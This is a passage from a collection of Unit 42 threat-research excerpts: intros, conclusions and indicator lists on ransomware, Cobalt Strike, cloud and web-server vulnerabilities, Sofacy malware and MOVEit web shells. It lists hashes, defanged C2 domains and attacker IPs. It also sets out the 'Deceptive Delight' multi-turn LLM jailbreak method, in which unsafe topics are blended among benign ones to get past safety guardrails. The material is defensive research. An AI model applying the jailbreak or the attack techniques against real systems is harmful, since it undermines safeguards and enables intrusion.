attack is difficult as there simply isn't enough evidence to conclusively determine who is behind it. Various conflicting evidence make it impossible to say for sure. However, what is clear is that attackers are shifting tactics in how ransomware is deployed, and ensuring their malware is constantly being updated to deter defenders.\nPalo Alto Networks customers are protected against this threat in the following ways:\nWildFire correctly identifies all Bucbi samples as malicious \nA BucbiAutoFocustag has been created in order to track this malware family has been created in order to track this malware family \nAll domains/IPs used in this attack have been flagged as malicious.", "source": "Palo"}, {"title": "Indicators", "content": "SHA256 Hashes \u2013 Ukrainian Variant\n26f2bf1fc3ee321d48dce649fae9951220f0f640c69d5433850b469115c144fe4c698f5a005a74570a10a69a82317b0c87207934fe82907ee7df3348096cd66c\nSHA256 Hashes \u2013 Original Bucbi\nad16c5246675b807cd04c33f5186f26c1c677e7b2f3baea3305b23e7cac34f8ebe63b6a01e57a7a409647bdf221a37a0be0d470d488136228a4c1d1defbd05f498e901f362641ae1fc6527215f496c9fd5de2d7f69b136ac610e453469831d072f8597a18c24d9c7ee4442f607b518c065bfef376c554ea80b303875bb0f5c4f713413ee1a008b91a6afb29c52d2beda829778b8072c5ba5171bb50277104ebc8577216183fc19767788e3d078eaeb754d18141c80c2554f9c3c359cc470c4f6feb6eccc9d254fb0e1c818be50ec183a472ed064d4071f380ac131c262da06890ed72a28ba5bac7f44f9e4519db5f8c8d94076d85a929c2004da1cba99559610ea7896c06595a261b140f1ce192230e0fc0bdb9213023db0a5d1b07eb91f7af327ba82a72339fef306ef6ce83c055c35caa7bf7116eea0edad22966d297661f370d59a3f1f508668b1ae214022a140fb96f90c221a192443b87a1fbe621cee0bfeecc0baccecabeddc8f0e07b3a7aa54d7f13d60e232b7a538b10cd773b4c5e5766b3a58b5ff86b1070c186b72854c69fff6fc11ce384d70c71db66f6c18a8c8a65293abd10e7c4a306ddfae94c67df2db411c4a29ca71a1ca8169ee640a8ed362f199dedfffef4eb71c33bdf22f4a9b3276f8a831999788059163fae43db48e8988f592efb88b4998b54c9736898339811bda3578b27e0a4a03ed9a4c5ca36360fb4c67f4fade5b00d1f57810ec379df3c39b546ead0865296a077e6a8b2f42ce122be2e52159c3e441c43b81a334b49b7763cf6a2265768d8e2df45478fc6a30645cdf85546f51862c7dc4750016f872683bc060cc34e4b462e01445a8abfd9b1b25ab5a6e5291a509c4ad94ab16c25925feaf9e6e8b217494596f76888202558d32c77167d08ab8594c5df99dd162ae975d8ceb1d169108fe0d70ac8df11a6e279ea746bc4692ff32acb697da0147ec056700fc095f8ff248317548bcbdcb56da464cd45f17bacf52b6497396e2c801625bd4068790d9d9515a087584f63014ff3948a11b7469882bda4e8fcf89600aaaf84d5d5b4bfcea1896acc4ed2ca563492d05b5bd0fd132dbb92142f6c8911325899c7a1cd9a462edf720ce27d47c697266cac58ba555fb3d7dd6e0afd08ecfc57702f3e3a9df96e9e4eef8b722d6b561b91cce444e9dc768bd93e0404e67f79900598ef03f175a10887c7b94c30c06fee4e154ad90945be70aae671aeefd103fa0947d957fdc973848221ada635cb497c79c027bab2b9a30c613b2c603296bcb29d63c8f30c27864c860955b3ebda1dc73eaaaa11ef3585bf389fcc3301c20c0636a144778d3ffb657110d911d1bd65593e94ef433a2597cf01591e96067180e548cd418327476931c642e01bdff4ec6ee80323c2365dfd4cfeba9a64f043df026a98b026ecb1e757c9df532f064cc7c24dd062e8538984a9d640600b91ff6c3a0404a5caf4f174c513c7f16fba45d753520b6c97bace23dbbece93ecd9eb9ac3cea1d8c9b4ccf6dfca43dc47556f51719dfeac4f52a90d52188c3b3e9145d77f612da784510c968564aa0d46e9e907d245b8854a8277379fb59d65102c2fd440c0bf850939e2a775a3bebb4cb1d0957912344ff93cba65088c4aed2bd2631e8a5788604520955104e05dcfb4b0c7cc35bbd4327a4212069eab5747944c5e8dedb82f02f695b0248d026a733f0c656485d996b50610b3c0ab86d7136bde215401c2f30154e818b4b18d3a4457eea11cc17e5e06f7d5e7c52979b5e7b75ea083e46a59e73ea245872e72084f44099dfb355d874db6f2d141c2789a041ccfa91775508fae2fedd86c48f0089abe00a15608834007b61eb4426bf034e8923733100fccf872ffebe2e05aea3d9f63fef26f2bf1fc3ee321d48dce649fae9951220f0f640c69d5433850b469115c144fe6edf7c043348efe02d94c97a4d06ec735fb90a77ea290509e03991edadb247164c5a0fd976f04c63faa32e1a74edd59c5c39ce0e143e69d464f95872b8357e8e59e06b077b8ac0472cb95401bf5d99301e0e807ed74d698a3953bc96c0eb568e\nCommand and Control Servers \u2013 Original Bucbi\nbbb.bth.in[.]uashalunishka12[.]orgceckiforeftukreksyxomoa[.]org87.249.215[.]196chultolsylrytseewooketh[.]biz\nAttacker IP Addresses\n31.184.197.6931.44.191.25179.117.151.23646.161.40.11191.101.31.126", "source": "Palo"}, {"title": "Introduction", "content": "Cobalt Strike is commercial threat emulation software that emulates a quiet, long-term embedded actor in a network. This actor, known as Beacon, communicates with an external team server to emulate command and control (C2) traffic. Due to its versatility, Cobalt Strike is commonly used as a legitimate tool by red teams \u2013 but is also widely used by threat actors for real-world attacks.\nCobalt Strike users control Beacon's HTTP indicators through a profile, and can select either the default profile or a customizable Malleable C2 profile.\nIn this blog post, we will go through the concepts and definitions associated with these profiles, and explore differences between default and customized Malleable C2 profiles used in the Cobalt Strike framework as well as in some true attacks in the wild. In doing so, we demonstrate how the Malleable C2 profile lends versatility to Cobalt Strike, and why this versatility makes Cobalt Strike an effective emulator for which it is difficult to design traditional firewall defenses.\nPalo Alto Networks customers receive protections against malicious uses of Cobalt Strike through Cortex XDR and the WildFire and Threat Prevention subscriptions for the Next-Generation Firewall.", "source": "Palo"}, {"title": "Conclusion", "content": "Cobalt Strike is a potent post-exploitation adversary emulator. The Malleable C2 profile detailed above is elaborate and is designed to evade security detections. A single security appliance is not equipped to prevent a Cobalt Strike attack. Only a combination of security solutions \u2013 firewalls, sandboxes, endpoints and software to integrate all these components can help prevent this kind of attack.\nPalo Alto Networks customers are protected from this kind of attack by the following:\nNext-Generation Firewalls(NGFWs) withThreat Preventionsignatures 86445 and 86446 identify HTTP C2 requests with default profiles. \nWildFire, an NGFW security subscription identifies and blocks Cobalt Strike Beacon. \nAutoFocususers can track this activity using theCobaltStriketags", "source": "Palo"}, {"title": "Indicators", "content": "CS Samples\n6a6e5d2faeded086c3a97e14994d663e2ff768cb3ad1f5a1aa2a2b5fd344dde2 \nfcdc426289dab0e5a73cd6fbac928ad48a8ff9b67e1d37df2794af6e7fa559e9\nCS Beacon Samples\n/Iya908e901d4ed0b43b46e632158f5ec5e900f16015e18995a875f62903a3c1eb1f9 \n08e901d4ed0b43b46e632158f5ec5e900f16015e18995a875f62903a3c1eb1f9 \n/api/1d8b385d680bcdf7646f35df612712f7a3991f50a21cac8379630d05b3d2337ae \nd8b385d680bcdf7646f35df612712f7a3991f50a21cac8379630d05b3d2337ae\nCS Team Server Domain\nwww.symantecav[.]xyz\nCS Team Server IP addresses\n66.42.72[.]250 \n146.0.77[.]110", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 researchers have discovered new security vulnerabilities in the Azure Data Factory Apache Airflow integration. Attackers can exploit these flaws by gaining unauthorized write permissions to a directed acyclic graph (DAG) file or using a compromised service principal.\nWhile classified as low severity vulnerabilities by Microsoft, the risk still carries significant potential impact for organizations that use Azure Data Factory. The vulnerabilities can provide attackers with shadow admin control over Azure infrastructure, which could lead to data exfiltration, malware deployment and unauthorized data access.\nOur research identified multiple vulnerabilities in the Azure Data Factory:\nMisconfigured Kubernetes RBAC in Airflow cluster \nMisconfigured secret handling of the Azure's internal Geneva service \nWeak authentication for Geneva\nExploiting these flaws could allow attackers to gain persistent access as shadow administrators over the entire Airflow Azure Kubernetes Service (AKS) cluster. This could enable malicious activities like data exfiltration, malware deployment or covert operations within the cluster.\nOnce inside, attackers can also manipulate Azure's internal Geneva service, which is responsible for managing critical logs and metrics. This could allow attackers to potentially tamper with log data or access other sensitive Azure resources.\nAlthough the cluster we used was isolated from other clusters, the fact that the managed Airflow instance used default, non-changeable configurations and the cluster admin role is attached to the Airflow runner caused a security issue. Attackers could manipulate this issue to control the Airflow cluster and related infrastructure.\nUnit 42 researchers have shared these vulnerabilities with Azure. This issue highlights the importance of carefully managing service permissions to prevent unauthorized access. It also highlights the importance of monitoring the operations of critical third-party services to prevent such access.\nIn this article, we provide an overview of our findings and outline key mitigation strategies to help safeguard cloud environments from similar threats.\nWe will also examine Azure's internal Geneva service, which was used in an Airflow instance with write permissions to specific shared storage accounts. Figure 1 illustrates the Azure Data Factory Airflow infrastructure and the attack process.\nPalo Alto Networks customers are better protected from the threats discussed in this article through the following products:\nCortex XDRandXSIAM \nAdvanced WildFire \nNext-Generation Firewallwith theAdvanced Threat Preventionsecurity subscription\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Background", "content": "Before we delve into the intricacies of our research on Azure Data Factory and Apache Airflow, it's essential to be aware of the following fundamental concepts.\nData Factory serviceData Factoryis an Azure-based data integration service that enables users to manage data pipelines when moving data between different sources. \nData Factoryis an Azure-based data integration service that enables users to manage data pipelines when moving data between different sources. \nAirflow serviceApache Airflowis an open-source platform that facilitates the scheduling and orchestration of complex workflows. This enables users to manage and schedule tasks as Python-coded DAGs. \nApache Airflowis an open-source platform that facilitates the scheduling and orchestration of complex workflows. This enables users to manage and schedule tasks as Python-coded DAGs. \nAirflow DAG filesDAG files define the workflow structure as Python code. These files specify the sequence in which tasks should be executed, dependencies between tasks and scheduling rules. \nDAG files define the workflow structure as Python code. These files specify the sequence in which tasks should be executed, dependencies between tasks and scheduling rules. \nAzure Airflow integration with Data FactoryAzure Data Factory offers amanaged Airflow instanceintegration that is deployed as an AKS cluster managed by Azure. \nAzure Data Factory offers amanaged Airflow instanceintegration that is deployed as an AKS cluster managed by Azure.", "source": "Palo"}, {"title": "Conclusion", "content": "Our research identified multiple vulnerabilities in the Azure Data Factory:\nMisconfigured Kubernetes RBAC in Airflow cluster \nMisconfigured secret handling of the Geneva service \nWeak authentication for Geneva\nThese vulnerabilities could enable attackers to escape from their pods, gain unauthorized administrative control over clusters and access Azure's internal services (Geneva). Attackers could exploit the vulnerabilities through compromised service principals or unauthorized modifications to DAG files. This could enable attackers to become shadow administrators and to gain full control over managed Airflow deployments on a single tenant base.\nWe would like to thank Microsoft MSRC for helping to resolve these issues.\nAdversaries have moved beyond basic tactics to more sophisticated service-specific attacks. Therefore, it is essential to adopt a comprehensive protection strategy that goes beyond simply safeguarding the cluster's perimeter.\nThis strategy should include:\nSecuring permissions and configurations within the environment itself, and using policy and audit engines to help detect and prevent future incidents (both within the cluster and in the cloud) \nSafeguarding sensitive data assets that interact with different services in the cloud, to understand which data is being processed with which data service\nPalo Alto Networks customers are better protected from the threats discussed above through the following products:\nAdvanced WildFirecloud-delivered malware analysis service accurately identifies known samples as malicious \nNext-Generation Firewallwith theAdvanced Threat Preventionsecurity subscription can help block the attacks with best practices via the following Threat Prevention signature:54790 \nCortex XDRandXSIAMoffer protections relevant to the threat described such as through the reverse shell module for Behavioral Threat Protection.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200\nPalo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Introduction", "content": "This article introduces a simple and straightforward technique for jailbreaking that we call Deceptive Delight. Deceptive Delight is a multi-turn technique that engages large language models (LLM) in an interactive conversation, gradually bypassing their safety guardrails and eliciting them to generate unsafe or harmful content.\nWe tested this simple yet effective method in 8,000 cases across eight models. We found that it achieves an average attack success rate of65%within just three interaction turns with the target model.\nDeceptive Delight operates by embedding unsafe or restricted topics among benign ones, all presented in a positive and harmless context, leading LLMs to overlook the unsafe portion and generate responses containing unsafe content. The method unfolds over two interaction turns with the target model, as shown in Figure 1.\nIn the first turn, the attacker requests the model to create a narrative that logically connects both the benign and unsafe topics. In the second turn, they ask the model to elaborate on each topic.\nDuring the second turn, the target model often generates unsafe content while discussing benign topics. Although not always necessary, our experiments show that introducing a third turn-specifically prompting the model to expand on the unsafe topic-can significantly increase the relevance and detail of the harmful content generated.\nTo evaluate the technique's effectiveness, we tested Deceptive Delight on eight state-of-the-art open-source and proprietary artificial intelligence (AI) models. It iscommon practiceto use an LLM to evaluate these types of techniques at scale to provide consistency and repeatability. The LLM judge assessed both the severity and quality of the unsafe content produced on a scale of one to five. This evaluation also helped identify the optimal conditions for achieving the highest success rate, as detailed in theevaluation section.\nTo focus on testing the safety guardrails built into the AI models, we disabled the content filters that would typically monitor and block prompts and responses with offensive material.\nGiven the scope of this research, it was not feasible to exhaustively evaluate every model. Furthermore, we do not intend to cast any false impression on any AI provider, so we have chosen to anonymize the tested models throughout the article.\nIt is important to note that this jailbreak technique targets edge cases and does not necessarily reflect typical LLM use cases. We believe that most AI models are safe and secure when operated responsibly and with caution.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Conclusion", "content": "The jailbreak problem presents a multi-faceted challenge. This arises from the inherent complexities of natural language processing, the delicate balance between usability and restrictions, and the current limitations in alignment training for language models. While ongoing research can yield incremental safety improvements, it is unlikely that LLMs will ever be completely immune to jailbreak attacks.\nIn this research, we introduced the Deceptive Delight jailbreak technique, which effectively circumvents the safeguards of LLMs. Our evaluation reveals persistent jailbreak risks in these systems, showing that even advanced models can be manipulated into generating unsafe content.\nHowever, these findings should not be seen as evidence that AI is inherently insecure or unsafe. Rather, they emphasize the need for multi-layered defense strategies to mitigate jailbreak risks while preserving the utility and flexibility of these models.\nBest practices, such as robust prompt engineering and the use of content filters, are crucial in reducing the risk of jailbreaks. When used together, these measures can strengthen the resilience of AI systems without compromising usability or stifling innovation.\nLooking ahead, future research should focus the following:\nEnhancing alignment training techniques \nExploring more defense mechanisms \nDeveloping comprehensive frameworks for evaluating and addressing jailbreak vulnerabilities\nIn addition, fostering a collaborative environment where researchers, developers and AI service providers work together is essential to stay ahead of emerging threats and continuously improve model resilience.\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200\nPalo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Introduction", "content": "During our continued research onSofacy's Komplex Trojan, we have found a sample of a backdoor Trojan that we believe the Sofacy group uses when targeting individuals running macOS systems. The backdoor Trojan authors have called it XAgentOSX, which shares the name XAgent with one of Sofacy's Windows-based Trojan and references Apple's previous name for macOS, OS X. It appears the same actor developed both the Komplex and XAgentOSX tools, based on similarities within the following project paths found within the tools:\nKomplex: /Users/kazak/Desktop/Project/komplex\nXAgent OSX: /Users/kazak/Desktop/Project/XAgentOSX\nWe believe it is possible that Sofacy uses Komplex to download and install the XAgentOSX tool to use its expanded command set on the compromised system.", "source": "Palo"}, {"title": "Conclusion", "content": "The Sofacy group continues to bolster their toolset to carry out attack campaigns on multiple platforms. In this case, the threat group uses the same name XAgent for this macOS-based tool as one of their Windows-based tools. Also, the macOS variant of this tool uses a similar network communications method as its Windows counterpart, which suggests this group continues to use consolidated C2 services to control compromised hosts, as we saw during our comparison of theKomplex and Seduploader(formerly referred to as Sofacy Carberp) tools. Also, while we lack attack telemetry, we were able to find a loose connection to the attack campaign that Sofacy waged on the Democratic National Committee based on hosting data in both attacks.\nPalo Alto Networks customers are protected from XAgentOSX via:\nKnown samples are detected as malicious by WildFire \nAll known C2 locations are marked as malicious in PANDB \nUsers can use AutoFocus tagXAgentto track this threat", "source": "Palo"}, {"title": "Introduction", "content": "The Unit 42 research team has researched and discovered three different vulnerabilities in the open sourceOpenLiteSpeed Web Server. These vulnerabilities also affect the enterprise version,LiteSpeed Web Server. By chaining and exploiting the vulnerabilities, adversaries could compromise the web server and gain fully privileged remote code execution. The vulnerabilities discovered include:\nRemote Code Execution (CVE-2022-0073) rated High severity (CVSS 8.8) \nPrivilege Escalation (CVE-2022-0074) rated High severity (CVSS 8.8) \nDirectory Traversal (CVE-2022-0072) rated Medium severity (CVSS 5.8)\nOpenLiteSpeedis theOpen Source editionofLiteSpeed Web Server Enterprise, which is developed and maintained by LiteSpeed Technologies. LiteSpeed Web Server is ranked the sixth most popular web server. Analysis from Palo Alto NetworksCortex XpanseandShodanreveals that LiteSpeed serves roughly 2% of all Web Server applications, with nearly 1.9 million unique servers globally.\nUnit 42 responsibly disclosed the vulnerabilities to LiteSpeed Technologies with suggested remediation on Oct. 4, 2022. LiteSpeed Technologies swiftly released a patch version (v1.7.16.1) on Oct. 18, 2022, to mitigate the reported vulnerabilities.\nOrganizations using OpenLiteSpeed versions 1.5.11 up to 1.7.16 and LiteSpeed versions 5.4.6 up to 6.0.11 are advised to update their software to the latest matching release \u2013 v1.7.16.1 and6.0.12.\nPalo Alto Networks customers usingPrisma Cloud WAASorNext-Generation FirewallswithAdvancedThreat Preventionreceive protection from these vulnerabilities by new rules and signatures that block the attack.", "source": "Palo"}, {"title": "Background", "content": "LiteSpeed is a performance-focused web server. According to our findings there are 1.9 million internet facing LiteSpeed Server instances online.\nAs part of our initiative to contribute to the community to improve security and increase security awareness, we decided to audit OpenLiteSpeed, which is the open source version of the LiteSpeed Web Server.\nWe tried to imitate the actions of an adversary and engaged in research with the intention of finding vulnerabilities and disclosing them to the vendor. This research has resulted in finding three vulnerabilities that affect both the enterprise and open source solutions. These could be chained and exploited by an adversary who has the credentials for the admin dashboard, in order to gain privileged code execution on vulnerable components.", "source": "Palo"}, {"title": "Conclusion", "content": "Web technologies, including web servers, have come a long way in the last few decades. They have become much more secure, but vulnerabilities are still being found as technologies are still evolving at a rapid pace.\nAs part of the commitment of Palo Alto Networks to advancing cloud security, we actively invest in the public cloud and web application research that includes advanced threat modeling and vulnerability testing of cloud platforms, web servers and related technologies\nPalo Alto Networks customers receive protection from this kind of attack through the following products and services:\nPrisma Cloud WAAScustomers received a virtual patch designated to mitigate this threat, and they remain protected until patches are applied to vulnerable assets. \nNext-Generation FirewallswithAdvancedThreat Preventionsignatures 93190 and 93191 can block the aforementioned attacks.\nWe'd like to thank LiteSpeed Technologies for quickly responding and patching the reported issues, and professionally handling the disclosure process.\nPalo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.\nUpdated Nov. 15, 2022, to adjust authorship to focus on the discoverer of the vulnerabilities.", "source": "Palo"}, {"title": "Introduction", "content": "As mentioned in our previousblog, we observed the Sofacy group using a new persistence mechanism that we call \"Office Test\" to load their Trojan each time the user opened Microsoft Office applications. Following the report, we received several questions regarding this persistence method, specifically how it works and which versions of Microsoft Office were affected. This blog will serve as a technical analysis of this persistence method that security professionals and network defenders can use for awareness, as we believe it is likely additional threat groups will begin using this technique.\nWe have added a malicious behavior tag namedOfficeDllSideloadingtoAutoFocusfor Palo Alto Networks customers to track the usage of this persistence method.", "source": "Palo"}, {"title": "Conclusion", "content": "The \"Office Test\" persistence mechanism allows threat actors to execute a Trojan each time a user runs any of the Office applications. This persistence mechanism loads a malicious DLL by leveraging a registry key that appears to be used during the development and testing of Microsoft Office applications. The use of this registry key for persistence is quite clever, as it requires user interaction to load and execute the malicious payload, which makes automated analysis in sandboxes challenging. Low awareness of this persistence method, coupled with the sandbox evasion obtained from user interactions, makes this a potentially attractive persistence method that we believe may be used in future attacks. Unit 42 suggests monitoring for systems that have this registry key already created, as it is possible a threat is already using the key for persistence purposes. Microsoft has added the \"Office Test\" registry keys to its Autoruns tool for detection purposes as well. Also, we suggest disabling this persistence method by creating the \"Office test\" registry key in read-only mode as outlined in this blog.", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 recently set out to better understand how well hospitals and other healthcare providers are doing in securing smart infusion pumps, which are network-connected devices that deliver medications and fluids to patients. This topic is of critical concern because security lapses in these devices have the potential to put lives at risk or expose sensitive patient data.\nWe reviewed crowdsourced data from scans of more than 200,000 infusion pumps on the networks of hospitals and other healthcare organizations usingIoT Security for Healthcarefrom Palo Alto Networks. An alarming 75 percent of infusion pumps scanned had known security gaps that put them at heightened risk of being compromised by attackers. These shortcomings included exposure to one or more of some 40 known cybersecurity vulnerabilities and/or alerts that they had one or more of some 70 other types of known security shortcomings for IoT devices.\nOne of the most striking findings was that 52 percent of all infusion pumps scanned were susceptible to two known vulnerabilities that were disclosed in 2019 \u2013 one with a \"critical\" severity score and the other with a \"high\" severity score.\nThere is already a vast array of information about known vulnerabilities and approaches for securing these devices, thanks to the efforts of medical equipment makers, security researchers, cybersecurity vendors and regulators who have spent the past decade working to better understand cyber risks associated with use of infusion pumps and other connected medical devices. For example, the U.S. Food and Drug Administration (FDA) announcedseven recalls for infusion pumpsor their components in 2021, andnine other recalls in 2020.\nThere are also initiatives led byindustryandgovernmentaimed atstandardizing device informationand establishing baseline security criteria for manufacturing these devices. Yet the average infusion pump has a life of eight to 10 years, which means the widespread use of legacy equipment has hampered efforts to improve security. Other factors also continue to undermine overall security hygiene \u2013 including insufficient use of network segmentation, failure to implement best practices for securing operational processes and insufficient security training for healthcare workers.\nOur discovery of security gaps in three out of four infusion pumps that we reviewed highlights the need for the healthcare industry to redouble efforts to protect against known vulnerabilities, while diligently following best practices for infusion pumps and hospital networks.\nHealthcare providers are protected against the vulnerabilities discussed here by the Palo Alto Networks IoT Security platform through the identification of managed and unmanaged devices and risks associated with those devices, the application of risk reduction policies and built-in prevention of known threats, as well as detection of and response to unknown threats.", "source": "Palo"}, {"title": "Conclusion", "content": "Among the 200,000 infusion pumps we studied, 75% were vulnerable to at least one vulnerability or threw up at least one security alert. While some of these vulnerabilities and alerts may be impractical for attackers to take advantage of unless physically present in an organization, all represent a potential risk to the general security of healthcare organizations and the safety of patients \u2013 particularly in situations in which threat actors may be motivated to put extra resources into attacking a target.\nWith attack surfaces widening and attack vectors becoming more refined than ever before, now's the time for healthcare organizations todefine medical device security with a new level of sophistication. To successfully implement secure clinical and device workflow management that is scalable, yet practical to maintain and enforce, the methodology should also alleviate the escalating operational burdens of securing and managing medical devices for both network security and clinical support teams.\nThe IoT Security platform protects customers from these security risks by accurately identifying devices on the network; assessing risk by evaluating device profiles for vulnerabilities, exposures or security advisories; detecting anomalies with ML-driven continuous monitoring; and enabling built-in prevention for attacks exploiting these vulnerabilities, including known and unknown threats, with automated Zero Trust policy recommendations and enforcement.", "source": "Palo"}, {"title": "Introduction", "content": "On May 31, Progress Software posted a notification alerting customers of a critical Structured Query Language injection (SQLi) vulnerability (CVE-2023-34362) in their MOVEit Transfer product. MOVEit Transfer is a managed file transfer (MFT) application intended to provide secure collaboration and automated file transfers of sensitive data.\nUpdate:On June 9 and June 15, Progress Softwarealerted customersof additional SQL Injection vulnerabilities (also rated critical by Progress and got assigned CVE-2023-35036 and CVE-2023-35708, respectively).\nCVE-2023-34362 \nCVE-2023-35036 \nCVE-2023-35708\nUpdate:On July 7, Progress Software released aservice packaddressing three additional vulnerabilities, one rated critical and two rated high.\nCVE-2023-36934(Critical) \nCVE-2023-36932(High) \nCVE-2023-36933(High)\nCVE-2023-36934 is an SQLi vulnerability that could allow anunauthenticatedattacker to gain unauthorized access to the MOVEit Transfer database. CVE-2023-36932 refers to multiple SQLi vulnerabilities that could allow anauthenticatedattacker to gain unauthorized access to the MOVEit Transfer database. Lastly, CVE-2023-36933 refers to a vulnerability that potentially allows an attacker to invoke a method that results in an unhandled exception that may cause the MOVEit Transfer application to terminate unexpectedly.\nAll three vulnerabilities were identified by security researchers and there is no evidence any of the vulnerabilities are currently being exploited in the wild.\nProgress recommends that all customers apply the July 2023 service pack as it contains fixes for all three vulnerabilities.\nIn all cases, the original vulnerability was being exploited to upload a web shell onto the MOVEit Transfer server. The web shell also allowed threat actors to enumerate files and folders on the MOVEit Transfer server, read configuration information, download files, and create or delete MOVEit server user accounts.\nUnit 42 Incident Response has assisted organizations through multiple previous and ongoing investigations where the initial point of compromise was the exploitation of MOVEit Transfer. The earliest evidence of compromise throughout our investigations is May 27 and tactics, techniques and procedures (TTPs) have so far been consistent with those reported by other organizations in their initial blogs.\nPalo Alto Networks Xpanse indicates there are at least 2,674 MOVEit servers exposing HTTP/HTTPs traffic. This does not include MOVEit Cloud servers. Progress has indicated that all MOVEit Cloud servers have been \"patched and fully restored.\"\nProgress Software has provided mitigation guidance that all MOVEit Transfer customers should seriously consider following.\nPalo Alto Networks customers receive protections from and mitigations for CVE-2023-34362 in the following ways:\nNext-Generation Firewall with the Advanced Threat Prevention security subscription can help block the associated web shell. \nNext Generation Firewall with a Threat Prevention security subscription can help block the attacks with Best Practices via Threat Prevention signatures. \nAdvanced URL Filtering can block known IoCs. \nA Cortex XSOAR response pack and playbook can automate the mitigation process. \nCortex XDR and XSIAM agents help protect against post-exploitation activities described in this blog using Behavioral Threat Protection, Anti-Webshell Protection and multiple additional security modules. \nCortex Analytics has multiple detection models that help detect post-exploitation activities, with other relevant coverage by the Identity Analytics and ITDR modules. \nCortex Xpanse customers can identify external facing instances of the application through the \"MOVEit Transfer\" attack surface rule. \nXQL queries provided below can be used with Cortex XDR to help track attempts to exploit this CVE. \nOrganizations can engage theUnit 42 Incident Responseteam for specific assistance with this threat and others. \nPrisma Cloud WAAS customers are protected from this threat through the App Firewall SQL Injection protection \nNext-Generation Firewall with the Advanced Threat Prevention security subscription can help block the associated web shell. \nNext-Generation Firewallwith the Advanced Threat Prevention security subscription can help detect and block the exploit traffic.", "source": "Palo"}, {"title": "Conclusion", "content": "Although the number of exposed servers is relatively small, Unit 42 recommends organizations using MOVEit Transfer follow Progress Software's mitigation guidance immediately. There are already reports of CVE-2023-34362 being exploited in the wild and there will likely be reports of more organizations who are affected in the near future.\nThe additional disclosures ofCVE-2023-35036 and CVE-2023-35708 should also be monitored by organizations.\nUnit 42 continues to track the vulnerabilities in MOVEit Transfer and will update this brief as more information becomes available.\nPalo Alto Networks has shared our findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.", "source": "Palo"}, {"title": "Indicators", "content": "Paths:\nD:\\MOVEitDMZ\\wwwroot\\human2.aspx \nE:\\MOVEitTransfer\\wwwroot\\human2.aspx \nC:\\Windows\\Temp\\erymbsqv\\erymbsqv.dll\nhuman2.aspx\nc82059564d6e7a6f56d3b1597cdfe98dfc4e30a2050024bd744f12a3ef237bb5 \n24c7fae1b7c02ebd84cc3c78553fb3a68d0466575abea4c92b2f792b47c41ef3 \nde4ad0052c273649e0aca573e30c55576f5c1de7d144d1d27b5d4808b99619cd \n7a8f53c4143bacd2104ccd07a6be68d76cda1a6985b8573b7735858a542178bb \n87ebfaf36fc7031bec477c70a86cb746811264f530d8af419767b9755e2b43e3 \n3ff0719da7991a38f508e72e32412a1ee498241bf84f65e973d6e93dc8fd1f66 \nf994063b9fea6e4b401ee542f6b6d8d6d3b9e5082b5313adbd02c55dc6b4feb7 \nbd45234763ef62f05d14b78c6497ed90706a271fad3b16a4ee6d99d178beedf3 \n3ff0719da7991a38f508e72e32412a1ee498241bf84f65e973d6e93dc8fd1f66 \nf994063b9fea6e4b401ee542f6b6d8d6d3b9e5082b5313adbd02c55dc6b4feb7 \nba2cf96fc5884cd69ecfe5d73f872958159a12b02ca610223f089ee0b6c3d25d \n6e1d3b5fcb4de48e1e06a68686817d13533f9740e315f4378bb5b9ef1fd1c7a9 \n2931994f3bde59c3d9da53e0062e4d993dc6fc655a1bd325e90af6dc494ed1fa \nf3543cd16de13214124bd7c91033c3cd3bbcf6587871257e699fd89df96fd86f\nVirusTotal Livehunthuman2.aspxandh2.aspx\ne8012a15b6f6b404a33f293205b602ece486d01337b8b3ec331cd99ccadb562e \n2413b5d0750c23b07999ec33a5b4930be224b661aaf290a0118db803f31acbc5 \nd477ec94e522b8d741f46b2c00291da05c72d21c359244ccb1c211c12b635899 \n929bf317a41b187cf17f6958c5364f9c5352003edca78a75ee33b43894876c62 \nb9a0baf82feb08e42fa6ca53e9ec379e79fbe8362a7dac6150eb39c2d33d94ad \n4359aead416b1b2df8ad9e53c497806403a2253b7e13c03317fc08ad3b0b95bf \nea433739fb708f5d25c937925e499c8d2228bf245653ee89a6f3d26a5fd00b7a \nd49cf23d83b2743c573ba383bf6f3c28da41ac5f745cde41ef8cd1344528c195 \n387cee566aedbafa8c114ed1c6b98d8b9b65e9f178cf2f6ae2f5ac441082747a \na1269294254e958e0e58fc0fe887ebbc4201d5c266557f09c3f37542bd6d53d7 \ncf23ea0d63b4c4c348865cefd70c35727ea8c82ba86d56635e488d816e60ea45 \nf0d85b65b9f6942c75271209138ab24a73da29a06bc6cc4faeddcb825058c09d \nc77438e8657518221613fbce451c664a75f05beea2184a3ae67f30ea71d34f37 \ndaaa102d82550f97642887514093c98ccd51735e025995c2cc14718330a856f4 \n3ab73ea9aebf271e5f3ed701286701d0be688bf7ad4fb276cb4fbe35c8af8409 \n93137272f3654d56b9ce63bec2e40dd816c82fb6bad9985bed477f17999a47db \n5b566de1aa4b2f79f579cdac6283b33e98fdc8c1cfa6211a787f8156848d67ff 